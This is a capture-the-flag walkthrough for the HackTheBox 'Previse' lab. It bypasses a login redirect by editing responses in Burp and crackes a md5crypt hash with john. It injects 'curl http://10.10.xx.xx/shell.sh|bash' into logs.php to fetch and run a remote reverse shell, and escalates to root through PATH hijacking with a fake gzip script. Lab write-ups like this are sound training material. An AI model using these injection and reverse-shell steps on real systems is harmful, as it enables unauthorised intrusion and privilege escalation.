HackTheBox Previse Walkthrough

![privese](https://user-images.githubusercontent.com/67886668/128668035-e6d8c71e-04eb-408e-97a7-0ab497b90ab7.PNG)

summary:
1- Scanning
2- Enumeration
3- Exploitation
4- Privilege Escalation

1-Scanning
port scanning:

![nmap](https://user-images.githubusercontent.com/67886668/128668136-b281f9c8-7024-42b2-ab80-b914b7154b68.PNG)

after using nmap we found 2 open ports: ssh and http and it is not have anything interesting.
2-Enumeration
Gobuster : 

![gobuster](https://user-images.githubusercontent.com/67886668/128668184-5c5d52ba-9dcc-465c-a166-75888ddc9a52.PNG)

It has a lot of php file.Lets go to website to collect more information.
After going to http://previse.htb/ we get a login form i tried sql injection for this form but it does not work so I tried to go for this php files but Most of them depends to login form so it does not work.
but there is an interesting file called “nav.php”
it is work but after that when i click in any link it is retrive me to login page
so i’m started burp and found this response  

![302](https://user-images.githubusercontent.com/67886668/128668257-bc8e4f7f-0b3d-413a-82f6-6e2d9f9c8e2f.PNG)
   
After searching for a while about 302 found i knew i can edit responses using burp suite  to bypass this so i changed 302 found to 200 OK and changed the location.
HINT:to change location file look to request to know what php file you need ;).
it is work :)
3-Exploitation

![add user](https://user-images.githubusercontent.com/67886668/128668323-78d2b7d2-ff9e-48f3-b4e0-889d3e096a4d.PNG)

you will get this page,create a user and do the same in response using burp to add user.
then you were added a new user. 
go to the login page and login with your created user.

![uploaded files](https://user-images.githubusercontent.com/67886668/128668407-c4c87635-dc5e-46a3-abe2-1229583edf4b.PNG)

you are logged in, while discovering pages you will find this zip file download it to your device 
and take a look for his file. You will find mysql server credentials but you will not connect to mysql server so you need to get a shell before.

![getting shell](https://user-images.githubusercontent.com/67886668/128668444-e54a3993-fe76-4ce7-92d5-97d7173891e2.PNG)

so the shell you will get it from “logs.php”.
 create your reverse shell in your device using bash from this link  here and use this 
<curl http://10.10.xx.xx/shell.sh|bash> in delim variable 
but before that use  nc -lvnp <port number> in your terminal 
you gets the shell as www-data 
now you can use mysql to get user accounts.
    
![no sql](https://user-images.githubusercontent.com/67886668/128668652-8fa2e91c-bcdc-40e1-8867-f53a80f11242.PNG)
    
in my  case after using mysql it was not connected and didn’t respond to me.

![sql](https://user-images.githubusercontent.com/67886668/128668725-b64b26f2-4f05-413c-aa56-59406d76f1cd.PNG)
    
So I used a spawning tty shell and then tried to use mysql and it worked.

![user](https://user-images.githubusercontent.com/67886668/128668782-91415229-f046-498a-a04b-e3aac22f403a.PNG)
    
and now using your sql skills you will get this 2 users the first one that you want and second one was your created user. 
So now it is time to crack the hash.

![hash crack](https://user-images.githubusercontent.com/67886668/128668843-b7c47669-2a2a-490c-b57c-e89a35a44b1c.PNG)
    
i used hashcat but it is takes an one hour and didn’t get the hash, if you used this:
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
you will know the hash type is md5crypt-long.
so after using this command in the above figure it will take time but in the end you will get cracked hash.
    
![now user](https://user-images.githubusercontent.com/67886668/128668898-08f47e41-19cf-4df3-88be-a6b4093d7930.PNG)

after getting the password for m4lwhere, i tried to connect using ssh but it wasn’t work 
and in www-data i couldn’t use sudo and su so i used spawning tty shell again and then
connected as a m4lwhere and get user.txt

4-Privilege Escalation

![sudo](https://user-images.githubusercontent.com/67886668/128668925-fbc6267d-fc4d-44a1-ba73-1930040b21b0.PNG)
    
using sudo -l  it is an interesting script /opt/scripts/access_backup.sh.
after reading this file it is use gzip 
with some search i found i can use path injection to getting a shell as root 
    
![code injection](https://user-images.githubusercontent.com/67886668/128669002-d9021b19-e866-420f-b833-dca2844ef277.PNG)

I went to /tmp file ,then created a gzip script. It has a reverse shell using bash and makes it an executable file. 

![path injection](https://user-images.githubusercontent.com/67886668/128669060-84b80c27-d187-4c6e-8fab-4c88d102e7e7.PNG)
    
then i exported /tmp to the PATH variable, after add tmp to PATH it is time to get root.

![run script](https://user-images.githubusercontent.com/67886668/128669090-fb60f0bc-2117-420d-a9cf-f9aec4d0210a.PNG)
    
before running access.backup.sh script, we will use nc to listen new reverse shell like:
nc -lvnp 4444
    
![root](https://user-images.githubusercontent.com/67886668/128669112-ed6f5186-2733-499e-9a9b-f5bac8b3f83c.PNG)

after running the script you were to get a shell as a root cat your flag ;-)

